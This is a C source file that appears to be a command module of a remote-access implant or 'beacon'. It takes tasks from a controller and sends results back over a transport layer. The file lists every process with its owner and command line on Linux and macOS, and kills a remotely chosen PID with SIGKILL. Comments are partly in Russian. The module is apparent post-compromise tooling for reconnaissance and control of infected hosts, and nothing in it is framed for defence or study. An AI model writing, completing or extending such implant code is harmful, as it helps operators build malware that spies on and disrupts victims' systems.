// Process listing and kill commands.
// Linux: reads /proc/[pid]/stat and /proc/[pid]/cmdline.
// macOS: uses sysctl(KERN_PROC) — /proc не существует на macOS.

#include "../core/beacon.h"
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>
#include <pwd.h>
#include <stdlib.h>
#include <sys/types.h>

#ifdef __APPLE__
#include <sys/sysctl.h>
#include <libproc.h>
#else
#include <dirent.h>
#include <fcntl.h>
#endif

// ---- ps: list processes -----------------------------------------------------

#ifdef __APPLE__
// macOS: sysctl + proc_pidpath
void cmd_ps(const BeaconTask* t) {
    out_begin(t->id, RESP_PS);

    const char* hdr = "PID       PPID      UID   USER            CMD\n";
    out_write(hdr, strlen(hdr));

    int mib[4] = { CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0 };
    size_t buf_size = 0;

    // Первый вызов — узнать размер буфера.
    if (sysctl(mib, 4, NULL, &buf_size, NULL, 0) < 0) {
        out_write("error: sysctl size query failed\n", 32);
        return;
    }

    // Аллоцируем с запасом (процессы могут появиться между вызовами).
    buf_size += buf_size / 8;
    char* buf = (char*)bmalloc(buf_size);
    if (!buf) {
        out_write("error: alloc failed\n", 20);
        return;
    }

    if (sysctl(mib, 4, buf, &buf_size, NULL, 0) < 0) {
        bfree(buf);
        out_write("error: sysctl failed\n", 21);
        return;
    }

    size_t nprocs = buf_size / sizeof(struct kinfo_proc);
    struct kinfo_proc* procs = (struct kinfo_proc*)buf;

    char line[512];
    for (size_t i = 0; i < nprocs; i++) {
        struct kinfo_proc* p = &procs[i];
        pid_t pid  = p->kp_proc.p_pid;
        pid_t ppid = p->kp_eproc.e_ppid;
        uid_t uid  = p->kp_eproc.e_ucred.cr_uid;

        // Имя пользователя.
        char username[32] = "?";
        struct passwd* pw = getpwuid(uid);
        if (pw && pw->pw_name)
            snprintf(username, sizeof(username), "%s", pw->pw_name);
        else
            snprintf(username, sizeof(username), "%u", uid);

        // Полный путь процесса (или comm как фолбэк).
        char cmdline[PROC_PIDPATHINFO_MAXSIZE];
        if (proc_pidpath(pid, cmdline, sizeof(cmdline)) <= 0) {
            snprintf(cmdline, sizeof(cmdline), "%s", p->kp_proc.p_comm);
        }

        int len = snprintf(line, sizeof(line), "%-9d %-9d %-5u %-15s %s\n",
                           pid, ppid, uid, username, cmdline);
        if (len > 0) out_write(line, (size_t)len);

        if (out_remaining() < 1024) {
            out_flush_chunk(get_transport(), 0);
        }
    }
    bfree(buf);
}

#else
// Linux: /proc-based implementation
void cmd_ps(const BeaconTask* t) {
    out_begin(t->id, RESP_PS);

    // Header
    const char* hdr = "PID       PPID      UID   USER            CMD\n";
    out_write(hdr, strlen(hdr));

    DIR* proc = opendir("/proc");
    if (!proc) {
        out_write("error: cannot open /proc\n", 24);
        return;
    }

    struct dirent* ent;
    while ((ent = readdir(proc)) != NULL) {
        // Only numeric directories (PIDs)
        int is_pid = 1;
        for (int i = 0; ent->d_name[i]; ++i) {
            if (ent->d_name[i] < '0' || ent->d_name[i] > '9') {
                is_pid = 0; break;
            }
        }
        if (!is_pid) continue;

        char path[256];
        char line[512];

        // Read /proc/<pid>/stat for PPID
        snprintf(path, sizeof(path), "/proc/%s/stat", ent->d_name);
        int fd = open(path, O_RDONLY);
        if (fd < 0) continue;
        char stat_buf[512];
        ssize_t nr = read(fd, stat_buf, sizeof(stat_buf) - 1);
        close(fd);
        if (nr <= 0) continue;
        stat_buf[nr] = 0;

        // Parse stat: pid (comm) state ppid ...
        // Find closing ')' to skip comm (may contain spaces)
        char* comm_end = strrchr(stat_buf, ')');
        if (!comm_end) continue;

        int ppid = 0;
        // After ')' skip " state " then read ppid
        if (comm_end[1] && comm_end[2]) {
            // Skip " X " (state char)
            char* p = comm_end + 4; // skip ") X "
            ppid = atoi(p);
        }

        // Read /proc/<pid>/status for UID
        snprintf(path, sizeof(path), "/proc/%s/status", ent->d_name);
        fd = open(path, O_RDONLY);
        int uid = -1;
        if (fd >= 0) {
            char status_buf[1024];
            nr = read(fd, status_buf, sizeof(status_buf) - 1);
            close(fd);
            if (nr > 0) {
                status_buf[nr] = 0;
                char* uid_line = strstr(status_buf, "\nUid:");
                if (uid_line) {
                    uid_line += 5; // skip "\nUid:"
                    while (*uid_line == '\t' || *uid_line == ' ') uid_line++;
                    uid = atoi(uid_line);
                }
            }
        }

        // Resolve username from UID
        char username[32] = "?";
        if (uid >= 0) {
            struct passwd* pw = getpwuid((uid_t)uid);
            if (pw && pw->pw_name) {
                snprintf(username, sizeof(username), "%s", pw->pw_name);
            } else {
                snprintf(username, sizeof(username), "%d", uid);
            }
        }

        // Read /proc/<pid>/cmdline
        snprintf(path, sizeof(path), "/proc/%s/cmdline", ent->d_name);
        fd = open(path, O_RDONLY);
        char cmdline[256] = "";
        if (fd >= 0) {
            nr = read(fd, cmdline, sizeof(cmdline) - 1);
            close(fd);
            if (nr > 0) {
                // Replace null separators with spaces
                for (ssize_t i = 0; i < nr - 1; ++i) {
                    if (cmdline[i] == 0) cmdline[i] = ' ';
                }
                cmdline[nr] = 0;
            }
        }

        // Fallback: read comm from stat if cmdline is empty
        if (cmdline[0] == 0) {
            char* comm_start = strchr(stat_buf, '(');
            if (comm_start && comm_end > comm_start) {
                size_t cl = (size_t)(comm_end - comm_start - 1);
                if (cl >= sizeof(cmdline)) cl = sizeof(cmdline) - 1;
                memcpy(cmdline, comm_start + 1, cl);
                cmdline[cl] = 0;
            }
        }

        int len = snprintf(line, sizeof(line), "%-9s %-9d %-5d %-15s %s\n",
                           ent->d_name, ppid, uid, username, cmdline);
        if (len > 0) out_write(line, (size_t)len);

        // Flush if getting large
        if (out_remaining() < 1024) {
            out_flush_chunk(get_transport(), 0);
        }
    }
    closedir(proc);
}
#endif

// ---- kill ------------------------------------------------------------------
void cmd_kill(const BeaconTask* t) {
    out_begin(t->id, RESP_OUTPUT);

    if (!t->pay || t->pay_len == 0) {
        out_write("error: usage kill <pid>\n", 23);
        return;
    }

    // Parse PID from payload
    char buf[32] = {0};
    size_t n = t->pay_len < sizeof(buf)-1 ? t->pay_len : sizeof(buf)-1;
    memcpy(buf, t->pay, n);
    int pid = atoi(buf);

    if (pid <= 0) {
        out_write("error: invalid pid\n", 19);
        return;
    }

    if (kill((pid_t)pid, SIGKILL) != 0) {
        char err[128];
        int len = snprintf(err, sizeof(err), "error: kill(%d): %s\n", pid, strerror(errno));
        out_write(err, (size_t)len);
    } else {
        char msg[64];
        int len = snprintf(msg, sizeof(msg), "killed pid %d\n", pid);
        out_write(msg, (size_t)len);
    }
}
